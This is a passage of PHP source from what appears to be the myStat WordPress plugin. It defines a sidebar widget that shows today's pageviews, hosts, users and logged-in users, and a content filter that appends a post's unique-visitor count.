        echo '<br/><p><input type="checkbox" id="myStat-st_hosts" name="myStat-st_hosts" value="1" '.($st_hosts==1?"checked":"").' /> <label for="myStat-st_hosts">' . __('Hosts', 'myStat') . '</label></p>';
        echo '<br/><p><input type="checkbox" id="myStat-st_users" name="myStat-st_users" value="1" '.($st_users==1?"checked":"").' /> <label for="myStat-st_users">' . __('Users', 'myStat') . '</label></p>';
        echo '<br/><p><input type="checkbox" id="myStat-st_auth" name="myStat-st_auth" value="1" '.($st_auth==1?"checked":"").' /> <label for="myStat-st_auth">' . __('Login Users', 'myStat') . '</label></p>';
        echo '<input type="hidden" id="myStat-submit" name="myStat-submit" value="1" />';
    }
    function myStat_widget($args) {
        extract($args);
        global $wpdb;
        $options = get_option('myStat_widget');
        $title = $options['title'];
        $pageviews = $options['st_pageviews'];
        $hosts = $options['st_hosts'];
        $users = $options['st_users'];
        $auth = $options['st_auth'];
        echo $before_widget;
        print($before_title . $title . $after_title);
        if($pageviews==1){
            $var=$wpdb->get_var("SELECT sum(count) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now());");
            echo __('Pageviews', 'myStat').": <i>".$var."</i><br/>";
        };
        if($hosts==1){
            $var=$wpdb->get_var("SELECT count(DISTINCT ip) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now());");
            echo __('Hosts', 'myStat').": <i>".$var."</i><br/>";
        };
        if($users==1){
            $var=$wpdb->get_var("SELECT count(DISTINCT ip) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now()) AND (date_load!='0000-00-00 00:00:00' or title!='');");
            echo __('Users', 'myStat').": <i>".$var."</i><br/>";
        };
        if($auth==1){
            $var=$wpdb->get_var("SELECT count(DISTINCT user) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now()) AND users!='';", ARRAY_N);
            echo __('Login Users', 'myStat').": <i>".$var."</i><br/>";
        };

        echo $after_widget;
    }
    register_sidebar_widget(__("myStat statistics","myStat"), 'myStat_widget');
    register_widget_control(__("myStat statistics","myStat"),'myStat_widget_control',300,200);
}


add_action('plugins_loaded', 'myStat_widget_init');
add_filter('the_content','myStat_Post',100);
function myStat_Post($content){
    if(get_option("myStat_show_post_stat")==1){
        $var=$GLOBALS['wpdb']->get_var("SELECT count(DISTINCT ip) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE post_id=".get_the_id()." AND (date_load!='0000-00-00 00:00:00' or title!='');");
        $content .= "<br/><a href='".$GLOBALS['myStat_uri']."'><img src='".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/admin.png' style='vertical-align:middle;' title='".__("myStat statistic for WordPress","myStat")."' border='0' /></a> ".__("Unique visitors to post","myStat").": <b>".($var!=''?number_format($var,0,',',' '):0)."</b><br/><br/>";
    };
	return $content;	
};
 

?>